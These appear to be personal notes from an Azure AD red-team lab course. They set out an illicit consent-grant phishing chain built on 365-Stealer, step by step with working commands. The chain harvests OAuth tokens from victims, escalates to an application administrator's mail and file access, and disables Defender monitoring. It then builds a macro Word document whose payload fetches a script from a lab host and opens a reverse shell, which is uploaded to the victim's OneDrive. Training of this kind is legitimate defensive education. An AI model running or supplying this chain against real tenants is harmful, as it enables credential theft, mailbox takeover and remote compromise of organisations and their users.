![[Pasted image 20241117060111.png]]

- Register a Multitenant application called `student<#>` in `defcorpextcontractors` tenant
- Provide the Redirect URI where you would like to receive tokens. 
	- In the Lab it will be the student VM `http://172.16.151.x/login/authorized`
- Go to the Certificates and Secrets blade and create a new Client Secret. Ensure to copy the secret before moving on. 
	- Go to API Permissions blade and add the following delegated permissions for MS Graph: user.read User.ReadBasic.All

Note that is you want to use Access Tokens you require to got the Authentication Blade  of the student<#> app, Check the Access Tokens(used for implicit flows) and click save.

- Once we have user privilege access  to the defcorphq tenant. Check if users are allowed to consent to apps.
- Use Azure Portal or the below command from the AzureAD Module
` (Get-AzureADMSAuthorizatioPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`
- IF the output above  is `ManagePermissionGrantForSelf.microsoft-user-default-legacy` which means users can consent for all apps

# 365 Stealer
- we can use 365 Stealer to abuse consent grant settings: `https://github.com/AlteredSecurity/365-Stealer`
- Note that the attack can be executed using o365 toolkit as well `https://github.com/mdsecactivebreach/o365-attack-toolkit`

- Run `xampp Control Panel`(Run as Admin) and start Apache on student vm.
- Copy the 365-stealer directory from `C:\AzAD\Tools` to `C:\xampp\htdocs` to capture tokens returned by Entra ID
- Using the 365-Stealer Configuration button configure CLIENTID, REDIRECTURL, and CLIENTSECRET
- Click on Run 365-stealer to run the tool
- Browse `https://localhost` using an incognito window  and click on Read More in the web page. This will give your the phising link that should be sent to the target. 

We need to find a way to send those links to the target. We can abuse applications that allow us to contact the user in the target organization. 
- We can find applications running on defcorphq tenant by sub-domain recon
- Use MicroBurst to find applications. We can add Permutations like career, hr, users, file backup to the permutation file used by microburst
```
C:\AzAD\Tools\MicroBurst\Misc\Invoker-EnumerateAzureSubDomains.ps1
Invoke-EnumerationAzureSubDomains -Base defcorphq -Verbose
``` 

- we can also assume that the `https://defcorphqcareer.azurewebsites.net` application is know as a contractor which may have some existing knowledge of the target.

Using the Need Help section of the career application running defcorphq, send the phising link
This explains the variables being used by the phising link. 
![[Pasted image 20241117075801.png]]

- wait for a couple of minutes and browse to `http://localhost:82/365-stealer/yourvictims/` on the attacking machine to get tokens for the victims who clicked the phising link
- Use the access token with Graph API to list other users in the tenant
- Note that only the permissions that we requested earlier are avaliabel with the access token. 
	- we can list all user thanks to User.ReadBasic.All

```
$Token = 'token....'
$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $Token"
	}
}
(Invoke-RestMethod @RequestParams).value
```


- We need to target an Application Administrator to grant consent for better permissions
- Ideally we have to target all the users but for the Lab we were able to confirm that `markdwalden@defcorphq.onmicorsoft.com` is assigned application admin

- We need to register a new app (or modify the existing app) and now request permissions that need admin consent - mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send
- Generate a new link using Read More on `http://localhost` and send an email to the user containing that link(Remeber to change the client id if you registered a new app)
- once the user simulation grants consent, we will get the access token of the application admin

Using the access token of the application admin we can use 365-stealer to  upload macro infested doc files to the users onedrive
- the user simulation will open these macro infested word files and execute macros
- a licensed version of Office365 is avaliable on 172.16.1.250 to create doc files
```powershell
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredentials ("office-vm\administrator", passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credentials $cred

Enter-SSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true

IEX(New-Object Net.Webclient).downloadstring("http://172.16.150.<x>:82/Out-Word.ps1")

Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.<x>:82/InvokePowerShellTcp.ps1'); Power -reverse -IPAdress 172.16.150.<x> -Port 4444" -OutputFile student<x>.doc

Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student<x>.doc -Destination C:\AzAD\Tools\student<x>.doc
```

- Next we can start a listener on the student VM
- on the studentVM use 365-stealer web console or CLI to upload the doc to OneDrive of the application admin. 
` python C:\xampp\htdocs\365-Stealer\365-Stealer.py --refresh-user MarkDWalden@defcorphq.onmicorsoft.com --upload C:\AzAD\Tools\student<X>.doc`


